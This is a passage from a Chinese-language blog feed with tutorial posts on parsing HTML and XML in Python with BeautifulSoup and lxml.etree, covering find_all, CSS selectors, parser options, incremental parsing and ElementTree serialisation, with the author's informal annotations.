</span>print(soup.find_all(name=<span class="string">'ul'</span>))</span><br><span class="line">[&lt;ul class="list" id="list-1"&gt;</span><br><span class="line">&lt;li class="element"&gt;Foo&lt;/li&gt;</span><br><span class="line">&lt;li class="element"&gt;Bar&lt;/li&gt;</span><br><span class="line">&lt;li class="element"&gt;Jay&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;, </span><br><span class="line">ul class="list list-small" id="list-2"&gt;</span><br><span class="line">&lt;li class="element"&gt;Foo&lt;/li&gt;</span><br><span class="line">&lt;li class="element"&gt;Bar&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup.find_all(name=<span class="string">'ul'</span>)))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">ResultSet</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(type<span class="params">(list<span class="params">(soup.find_all<span class="params">(name=<span class="string">'ul'</span>)</span>)</span>)</span>)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">list</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span><span class="params">(type<span class="params">(soup.find_all<span class="params">(name=<span class="string">'ul'</span>)</span>[<span class="number">0</span>])</span>)</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> '<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">Tag</span>'&gt;</span></span><br></pre></td></tr></table></figure><h3 id="soup-bs4-BeautifulSoup-与-ul-bs4-element-Tag"><a href="#soup-bs4-BeautifulSoup-与-ul-bs4-element-Tag" class="headerlink" title="soup ( bs4.BeautifulSoup) 与 ul ( bs4.element.Tag )"></a>soup ( bs4.BeautifulSoup) 与 ul ( bs4.element.Tag )</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bs4</span>.<span class="title">BeautifulSoup</span>'&gt;</span></span><br><span class="line">&gt;&gt;&gt; ul = soup.find_all('ul')[0]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(ul)</span><br><span class="line">&lt;ul class="list" id="list-1"&gt;</span><br><span class="line">&lt;li class="element"&gt;Foo&lt;/li&gt;</span><br><span class="line">&lt;li class="element"&gt;Bar&lt;/li&gt;</span><br><span class="line">&lt;li class="element"&gt;Jay&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(ul))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">bs4</span>.<span class="title">element</span>.<span class="title">Tag</span>'&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">-------------- <span class="title">The</span> <span class="title">Most</span> <span class="title">Important</span> <span class="title">Is</span>:</span> ------------</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(ul)</span><br><span class="line">[<span class="string">'HTML_FORMATTERS'</span>, <span class="string">'XML_FORMATTERS'</span>, <span class="string">'__bool__'</span>, <span class="string">'__call__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__copy__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__delitem__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, ..., <span class="string">'find_all'</span>, <span class="string">'find_all_next'</span>, <span class="string">'find_all_previous'</span>, <span class="string">'find_next'</span>, <span class="string">'find_next_sibling'</span>, <span class="string">'find_next_siblings'</span>, <span class="string">'find_parent'</span>, <span class="string">'find_parents'</span>, <span class="string">'find_previous'</span>, <span class="string">'find_previous_sibling'</span>, <span class="string">'find_previous_siblings'</span>,..., <span class="string">'string'</span>, <span class="string">'strings'</span>, ...]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(soup);;结果与上面 dir(ul) 有很多重合的方法，此处仅列出一小部分...</span><br><span class="line">[<span class="string">'HTML_FORMATTERS'</span>, <span class="string">'XML_FORMATTERS'</span>, <span class="string">'__bool__'</span>, <span class="string">'__call__'</span>, <span class="string">'__class__'</span>, <span class="string">'__contains__'</span>, <span class="string">'__copy__'</span>, <span class="string">'__delattr__'</span>, <span class="string">'__delitem__'</span>, <span class="string">'__dict__'</span>, <span class="string">'__dir__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__eq__'</span>, <span class="string">'__format__'</span>, <span class="string">'__ge__'</span>, ..., <span class="string">'find_all'</span>, <span class="string">'find_all_next'</span>, <span class="string">'find_all_previous'</span>, <span class="string">'find_next'</span>, <span class="string">'find_next_sibling'</span>, <span class="string">'find_next_siblings'</span>, <span class="string">'find_parent'</span>, <span class="string">'find_parents'</span>, <span class="string">'find_previous'</span>, <span class="string">'find_previous_sibling'</span>, <span class="string">'find_previous_siblings'</span>,..., <span class="string">'string'</span>, <span class="string">'strings'</span>, ...]</span><br></pre></td></tr></table></figure><h3 id="text"><a href="#text" class="headerlink" title="text"></a>text</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> re</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>html=<span class="string">'''</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;div class="panel"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;div class="panel-body"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;a&gt;Hello, this is a link&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;a&gt;Hello, this is a link, too&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>'''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(soup.find_all(text=re.compile(<span class="string">'link'</span>)))</span><br><span class="line">[<span class="string">'Hello, this is a link'</span>, <span class="string">'Hello, this is a link, too'</span>];;很像 list</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup.find_all(text=re.compile(<span class="string">'link'</span>))))</span><br><span class="line">&lt;class 'bs4.element.ResultSet'&gt;;;不是返回 list 类型，但很像list，所以查清楚 ResultSet 类型和 list 有何关系</span><br></pre></td></tr></table></figure><h3 id="select-CSS-选择器"><a href="#select-CSS-选择器" class="headerlink" title="select - CSS 选择器"></a>select - CSS 选择器</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>html=<span class="string">'''</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;div class="panel"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;div class="panel-heading"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;h4&gt;Hello&lt;/h4&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;div class="panel-body"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;ul class="list" id="list-1"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Foo&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Bar&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Jay&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;ul class="list list-small" id="list-2"&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Foo&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>            &lt;li class="element"&gt;Bar&lt;/li&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>        &lt;/ul&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    &lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;/div&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>'''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>soup = BeautifulSoup(html, <span class="string">'lxml'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(soup.select(<span class="string">'.panel .panel-heading'</span>)))</span><br><span class="line">&lt;class 'list'&gt;;;这里是list类型，而不是像上面那样的 ResultSet 类型</span><br></pre></td></tr></table></figure><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><ul><li>推荐使用 LXML 解析库，必要时使用 html.parser。</li><li>节点选择筛选功能弱但是速度快。</li><li>建议使用 find()、find_all() 查询匹配单个结果或者多个结果。</li><li>如果对 CSS 选择器熟悉的话可以使用 select() 选择法。</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文是对《Python3 网络爬虫开发实战的》的部分实践以及探讨。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml.etree tutorial - part five</title>
    <link href="https://pwn4justice.github.io/2019/07/08/lxml-etree-tutorial-part-five/"/>
    <id>https://pwn4justice.github.io/2019/07/08/lxml-etree-tutorial-part-five/</id>
    <published>2019-07-08T14:21:01.000Z</published>
    <updated>2019-07-08T14:44:31.252Z</updated>
    
    <content type="html"><![CDATA[<p>原文来源：<code>https://lxml.de/tutorial.html</code></p><p>本文内容：</p><ol><li>解析器对象</li><li>增量解析</li></ol><a id="more"></a><h3 id="解析器对象"><a href="#解析器对象" class="headerlink" title="解析器对象"></a>解析器对象</h3><p>默认来说，lxml.etree 使用了自带默认设置的标准解析器。如果你想配置这个解析器的话，可以先创建一个新的实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser = etree.XMLParser(remove_blank_text=<span class="literal">True</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(parser))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">lxml</span>.<span class="title">etree</span>.<span class="title">XMLParser</span>'&gt;</span></span><br></pre></td></tr></table></figure><p>上面语句创建了一个自定义的解析器，它会在解析的时候移除不同标签之间的空白文本，这会减小树的体积，并且避免出现空白的 TAIL 文本，我们知道这种位于一个标签尾部同时位于紧接着的另一标签头部的空白文本对我们的数据来说是毫无意义的。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.XML(<span class="string">"&lt;xml&gt;   &lt;a/&gt;   &lt;b&gt;   &lt;/b&gt;   &lt;c&gt;  test   &lt;/c&gt;   &lt;/xml&gt;"</span>, parser)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(type(root))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">lxml</span>.<span class="title">etree</span>.<span class="title">_Element</span>'&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">etree</span>.<span class="title">tostring</span><span class="params">(root)</span></span></span><br><span class="line"><span class="class"><span class="title">b</span>'&lt;<span class="title">xml</span>&gt;&lt;<span class="title">a</span>/&gt;&lt;<span class="title">b</span>&gt;   &lt;/<span class="title">b</span>&gt;&lt;<span class="title">c</span>&gt;  <span class="title">test</span>   &lt;/<span class="title">c</span>&gt;&lt;/<span class="title">xml</span>&gt;'</span></span><br></pre></td></tr></table></figure><p>注意：在 <code>&lt;b&gt;</code> 标签和 <code>&lt;c&gt;</code> 标签内部的空白字符没有移除，因为叶子元素里的内容通常被认为是<strong>数据</strong>（即使是空的）。不过你可以很容易的使用一些额外的步骤在遍历树的时候将其空白删除：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b'&lt;xml&gt;&lt;a/&gt;&lt;b&gt;   &lt;/b&gt;&lt;c&gt;  test   &lt;/c&gt;&lt;/xml&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> element <span class="keyword">in</span> root.iter(<span class="string">"*"</span>):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> element.text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> element.text.strip():</span><br><span class="line"><span class="meta">... </span>            element.text = <span class="literal">None</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line">b'&lt;xml&gt;&lt;a/&gt;&lt;b/&gt;&lt;c&gt;  test   &lt;/c&gt;&lt;/xml&gt;';; &lt;b&gt;   &lt;/b&gt; 变成了 &lt;b/&gt;</span><br></pre></td></tr></table></figure><p>参考 <em>help(etree.XMLParser)</em> 命令来了解更多的解析器选项。</p><br><h3 id="增量解析"><a href="#增量解析" class="headerlink" title="增量解析"></a>增量解析</h3><p><strong>不是像上面那样一次性完整解析，而是慢慢地，一步一步获取并解析一些片段数据，直至数据’传输’完整并解析完成</strong></p><p>lxml.etree 为增量逐步解析（incremental step-by-step parsing）提供了两种方式。一种是通过类文件对象（特点是有一个可以反复调用 的read()函数）。这种方式在待解析数据的来源是 <strong>urllib</strong> 或<strong>其他类文件对象</strong>（在一个网络请求中的数据）时特别有用。不过在这种情况下，解析器也会暂时被阻塞并且等待，直到数据顺利传输完成（数据是有效的）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">DataSource</span>:</span></span><br><span class="line"><span class="meta">... </span>    data = [ <span class="string">b"&lt;roo"</span>, <span class="string">b"t&gt;&lt;"</span>, <span class="string">b"a/"</span>, <span class="string">b"&gt;&lt;"</span>, <span class="string">b"/root&gt;"</span> ]</span><br><span class="line">...     def read(self, requested_size):;;??? requested_size 是什么? 哪来的???</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">try</span>:</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">return</span> self.data.pop(<span class="number">0</span>)</span><br><span class="line"><span class="meta">... </span>        <span class="keyword">except</span> IndexError:</span><br><span class="line"><span class="meta">... </span>            <span class="keyword">return</span> <span class="string">b''</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree = etree.parse(DataSource())</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(tree)</span><br><span class="line"><span class="string">b'&lt;root&gt;&lt;a/&gt;&lt;/root&gt;'</span></span><br></pre></td></tr></table></figure><p>第二种方式是通过一个 feed 解析器接口，由 feed(data) 和 close() 方法组成：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser = etree.XMLParser()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"&lt;roo"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"t&gt;&lt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"a/"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"&gt;&lt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"/root&gt;"</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = parser.close()</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">b'&lt;root&gt;&lt;a/&gt;&lt;/root&gt;'</span></span><br></pre></td></tr></table></figure><p>这里，你可以随时打断解析过程并随后再次调用 feed() 方法来继续解析。这在你不想使用阻塞式的解析器时十分方便，例如在像 Twisted 这样的框架中，或者当数据传输的速率及大小都不稳定的情况下，也或者你想在等待下一块数据的时候能够干些别的事的时候。</p><p>在调用了 close() 方法（或者解析器抛出了一个异常）之后，你可以再次使用 feed() 来重用这个解析器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>parser.feed(<span class="string">"&lt;new_cycle/&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = parser.close()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">b'&lt;new_cycle/&gt;'</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;原文来源：&lt;code&gt;https://lxml.de/tutorial.html&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;本文内容：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;解析器对象&lt;/li&gt;
&lt;li&gt;增量解析&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lxml.etree tutorial - part four</title>
    <link href="https://pwn4justice.github.io/2019/07/07/lxml-etree-tutorial-part-four/"/>
    <id>https://pwn4justice.github.io/2019/07/07/lxml-etree-tutorial-part-four/</id>
    <published>2019-07-07T11:04:34.000Z</published>
    <updated>2019-07-08T14:43:02.815Z</updated>
    
    <content type="html"><![CDATA[<p>原文来源：<code>https://lxml.de/tutorial.html</code></p><p>本文目录：</p><ol><li>ElementTree 类</li><li>从字符串和文件中解析</li></ol><a id="more"></a><h2 id="ElementTree-类"><a href="#ElementTree-类" class="headerlink" title="ElementTree 类"></a>ElementTree 类</h2><p>一个 元素树（ElementTree）对象大体上可以看成是一个 包含根节点的树的文档包装器（顾名思义：ElementTree 是用来包装XML文档的，意味着你要给他传递一个XML文档对象）。其还提供了数个方法以供序列化和常见的文档处理功能。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.XML(<span class="string">'''\;;此处反斜杠好像是为了避免出现开头的空格导致格式混乱</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;!DOCTYPE root SYSTEM "test" [ &lt;!ENTITY tasty "parsnips"&gt; ]&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;root&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>  &lt;a&gt;&amp;tasty;&lt;/a&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&lt;/root&gt;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>'''</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree = etree.ElementTree(root)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tree.docinfo.xml_version)</span><br><span class="line"><span class="number">1.0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tree.docinfo.doctype)</span><br><span class="line">&lt;!DOCTYPE root SYSTEM <span class="string">"test"</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree.docinfo.public_id = <span class="string">'-//W3C//DTD XHTML 1.0 Transitional//EN'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>tree.docinfo.system_url = <span class="string">'file://local.dtd'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(tree.docinfo.doctype)</span><br><span class="line">&lt;!DOCTYPE root PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"file://local.dtd"</span>&gt;</span><br></pre></td></tr></table></figure><br><p>一个 ElementTree 对象也是当你调用 <em>parse()</em> 函数来解析文件或者类文件对象时所返回的内容（详情见下文的 parsing ‘解析’一节）</p><p>与 Element 类只序列化出单个元素的一个重要区别就是，ElementTree 类会序列化出一个完整的文档，也就是包含了顶层的（top-level）处理指令和注释，当然还有一个 DOCTYPE 和其他 DTD 内容（DTD content）：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(etree.tostring(tree))  <span class="comment"># lxml 1.3.4 and later</span></span><br><span class="line">&lt;!DOCTYPE root PUBLIC <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"file://local.dtd"</span> [ &lt;!ENTITY tasty <span class="string">"parsnips"</span>&gt;] &gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;a&gt;parsnips&lt;/a&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><br><p>在原始的 xml.etree.ElementTree 实现 和低于 1.3.3 版本的 lxml 实现中，序列化一个 ElementTree 时的输出和序列化一个 root 元素结果看起来是一样的：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(etree.tostring(tree.getroot()))</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;a&gt;parsnips&lt;/a&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><br><p>这种序列化的行为在 lxml 1.3.4 中已经改变了。以前，树的序列化不包含 DTD 内容，这就使得 lxml 在输入输出循环中失去了 DTD 信息。</p><br><h2 id="从字符串和文件中解析"><a href="#从字符串和文件中解析" class="headerlink" title="从字符串和文件中解析"></a>从字符串和文件中解析</h2><p>lxml.etree 支持从所有重要（常见）的源头，也就是&lt;字符串&gt;、&lt;文件&gt;、&lt;URL（包括http/tcp）&gt;、类文件对象中，以多种方式解析 XML 数据。主要的解析函数有 <strong>fromstring()</strong> 和 <strong>parse()</strong> ，这两个函数都使用 数据源（source）作为第一个参数，通常使用默认的解析器，但是你可以自己传递一个不同的解析器给第二个参数。</p><br><h3 id="fromstring-函数"><a href="#fromstring-函数" class="headerlink" title="fromstring() 函数"></a>fromstring() 函数</h3><p>这是解析字符串的最简单的一个函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>my_data = <span class="string">"&lt;root&gt;root_text&lt;/root&gt;"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.fromstring(my_data)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> type(root)</span><br><span class="line">&lt;type <span class="string">'lxml.etree._Element'</span>&gt;<span class="string">'''注意这里是 Element 类型，而 parse() 返回 ElementTree 类型'''</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> root.tag</span><br><span class="line">root</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">'&lt;root&gt;root_text&lt;/root&gt;'</span></span><br></pre></td></tr></table></figure><br><h3 id="XML-函数"><a href="#XML-函数" class="headerlink" title="XML() 函数"></a>XML() 函数</h3><p>XML() 表现地和 fromstring() 很相似，但常常是将 XML 字面量（直接量）直接填到参数里，而不是使用一个额外的变量：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.XML(<span class="string">"&lt;html&gt;Hello&lt;/html&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> type(root)</span><br><span class="line">&lt;type <span class="string">'lxml.etree._Element'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> root.tag</span><br><span class="line">html</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>etree.tostring(root)</span><br><span class="line"><span class="string">'&lt;html&gt;Hello&lt;/html&gt;'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root)</span><br><span class="line">&lt;html&gt;Hello&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><p>类似的还有一个 <strong>HTML()</strong> 函数：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>root = etree.HTML(<span class="string">"&lt;p&gt;some data&lt;/p&gt;"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> type(root)</span><br><span class="line">&lt;type <span class="string">'lxml.etree._Element'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> root.tag</span><br><span class="line">html</span><br><span class="line">&gt;&gt;&gt; ??? WHAT IS THT FUCK IN HERE ??? </span><br><span class="line"><span class="meta">... </span>The Answer <span class="keyword">is</span>: ... THAT, HTML() automatically complete the &lt;p&gt; by wrapping it <span class="keyword">with</span> &lt;html&gt; <span class="keyword">and</span> &lt;body&gt;.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> etree.tostring(root)</span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;p&gt;some data&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><br><h3 id="parse-函数"><a href="#parse-函数" class="headerlink" title="parse() 函数"></a>parse() 函数</h3><p>这个函数是被用来从<strong>文件</strong>或者<strong>类文件对象</strong>中解析文档的。<br>参考下面这个类文件对象的例子，下面这个例子的代码使用了 <strong>BytesIO 类</strong> （这个类可以用字符串模拟从文件读取，而不是去读一个真实的外部文件）。BytesIO 类来自于 Python2.6 及以后版本的 <strong>io</strong> 模块。在稍老一点版本的 Python 